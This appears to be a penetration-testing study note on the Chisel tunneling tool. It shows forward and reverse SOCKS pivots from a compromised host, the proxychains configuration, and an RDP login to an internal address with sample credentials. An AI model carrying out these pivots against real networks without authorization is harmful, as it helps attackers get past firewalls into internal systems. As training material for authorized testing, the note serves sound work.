---
tags:
  - SSHTunnelling
  - Exploitation
  - Tunnelling
  - Tooling
---
[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment.

Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Chisel is very similar to crowbar though achieves much higher performance.

[Tunneling with Chisel and SSF | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)

#### Installation

```shell-session
git clone https://github.com/jpillora/chisel.git
```

```shell-session
cd chisel
```

We will need the programming language `Go` installed on our system to build the Chisel binary

```shell-session
go build
```

##### Prebuilt

```shell-session
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
```

```
gzip -d chisel_1.7.7_linux_amd64.gz
```

```
mv chisel_* chisel && chmod +x ./chisel
```

```
sudo ./chisel server --reverse 
```

#### Usage

##### Running the Chisel Server on the Pivot Host

```shell-session
./chisel server -v -p 1234 --socks5
```

The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host.

##### Connecting to the Chisel Server

```shell-session
./chisel client -v 10.129.202.64:1234 socks
```

##### Setup Proxychains

```shell-session
[!bash!]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Chisel Reverse Pivot

There may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.

When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.

#### Starting the Chisel Server on our Attack Host

```shell-session
sudo ./chisel server --reverse -v -p 1234 --socks5
```

#### Connecting the Chisel Client to our Attack Host

```shell-session
./chisel client -v 10.10.14.17:1234 R:socks
```

#### Editing & Confirming proxychains.conf

```shell-session
[!bash!]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
